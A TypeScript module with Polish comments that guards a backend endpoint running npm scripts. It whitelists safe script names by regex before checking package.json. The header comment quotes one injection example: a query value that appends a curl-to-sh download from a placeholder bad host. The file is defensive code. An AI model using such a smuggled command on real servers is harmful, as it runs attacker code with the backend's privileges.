/**
 * npmScripts.ts — co wolno uruchomić przez `POST /nodejs/run`.
 *
 * ## Dlaczego to jest osobna, sprawdzana funkcja
 *
 * Skrypty odpalamy przez `spawn('npm', args, { shell: true })`. Powłoka skleja
 * argumenty z powrotem w wiersz polecenia, więc **nazwa skryptu jest
 * wykonywana**. Bez kontroli `?script=build;%20curl%20zly.sh%20|%20sh`
 * uruchomiłoby się na serwerze — z prawami procesu backendu.
 *
 * Kolejność sprawdzeń nie jest dowolna: najpierw kształt nazwy, dopiero potem
 * obecność w `package.json`. Odwrotnie wystarczyłoby **wpisać** złośliwą nazwę
 * do `package.json` (a ten plik użytkownik edytuje sam w Drive), żeby ją
 * wykonać.
 */

/**
 * Nazwy, jakich npm faktycznie używa: litery, cyfry oraz `:`, `-`, `_`, `.`.
 *
 * Świadomie węższe niż to, co npm dopuszcza — nazwa ze spacją albo cudzysłowem
 * jest w praktyce nieużywana, a każdy dopuszczony znak trzeba by osobno
 * przemyśleć pod kątem powłoki.
 */
const SAFE_NAME = /^[A-Za-z0-9][A-Za-z0-9:._-]{0,63}$/;

export function isSafeScriptName(name: string): boolean {
    return SAFE_NAME.test(name);
}

/**
 * Skrypty z treści `package.json`.
 *
 * `null` znaczy „nie umiem przeczytać tego pliku" i jest czym innym niż pusty
 * zestaw, czyli „projekt bez skryptów". Zlanie obu w jedno kazałoby
 * użytkownikowi zgadywać, czy plik jest zepsuty, czy po prostu nic nie definiuje.
 */
export function readPackageScripts(text: string): Record<string, string> | null {
    let parsed: unknown;
    try {
        parsed = JSON.parse(text);
    } catch {
        return null;
    }
    if (!parsed || typeof parsed !== 'object') return null;
    const raw = (parsed as Record<string, unknown>)['scripts'];
    if (!raw || typeof raw !== 'object' || Array.isArray(raw)) return {};
    const out: Record<string, string> = {};
    for (const [key, value] of Object.entries(raw as Record<string, unknown>)) {
        if (typeof value === 'string') out[key] = value;
    }
    return out;
}

export type NpmRunPlan =
    | { ok: true; args: string[] }
    | { ok: false; reason: string };

/**
 * Argumenty npm dla żądanego skryptu — albo odmowa z powodem.
 *
 * `install` jest jedynym poleceniem spoza `scripts`: to ono zakłada
 * `node_modules`, więc wymaganie wpisu w `package.json` uniemożliwiałoby
 * pierwsze uruchomienie.
 */
export function resolveNpmRun(script: string, scripts: Record<string, string> | null): NpmRunPlan {
    if (!isSafeScriptName(script)) {
        return { ok: false, reason: `Niedozwolona nazwa skryptu: ${JSON.stringify(script)}` };
    }
    if (script === 'install') return { ok: true, args: ['install', '--include=dev'] };

    if (scripts === null) {
        return { ok: false, reason: 'Nie udało się odczytać package.json — poza „install" nic nie uruchomię.' };
    }
    if (!Object.prototype.hasOwnProperty.call(scripts, script)) {
        const available = Object.keys(scripts).sort();
        return {
            ok: false,
            reason: available.length
                // Nazwanie dostępnych zamienia „nie" w odpowiedź na pytanie
                // „to co mam wpisać".
                ? `package.json nie ma skryptu „${script}". Dostępne: ${available.join(', ')}.`
                : `package.json nie definiuje żadnych skryptów (żądano „${script}").`,
        };
    }
    return { ok: true, args: ['run', script] };
}
